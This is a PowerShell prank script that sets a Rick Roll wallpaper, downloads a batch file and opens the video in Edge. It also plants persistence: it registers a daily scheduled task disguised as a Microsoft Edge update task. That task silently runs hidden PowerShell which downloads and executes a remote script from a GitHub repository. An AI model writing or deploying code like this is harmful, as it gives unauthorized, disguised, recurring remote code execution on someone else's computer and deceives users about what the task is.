$filename = "C:\temp\rickroll.jpg"
$bat = 'C:\temp\lobster.bat'

#If the file does not exist, create it.
if (-not(Test-Path -Path $filename -PathType Leaf)) {
   mkdir C:\temp
   Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/rickroll.jpg -OutFile C:\temp\rickroll.jpg
   $MyWallpaper="C:\temp\rickroll.jpg"
$code = @'
using System.Runtime.InteropServices;
namespace Win32{

    public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

        public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
        }
    }
}
'@
}

if (-not(Test-Path -Path $bat -PathType Leaf)) {
   Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/Lobster.bat -OutFile C:\temp\lobster.bat
  
}


if ((Test-Path -Path $filename -PathType Leaf)) {


    $MyWallpaper="C:\temp\rickroll.jpg"
$code = @'
using System.Runtime.InteropServices;
namespace Win32{

    public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

        public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
        }
    }
}
'@
}




add-type $code
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
$action = New-ScheduledTaskAction -Execute 'powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://github.com/CHONK12/rickRoll/raw/main/Blue.ps1');"' 
$trigger = New-ScheduledTaskTrigger -Daily -At 3pm
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
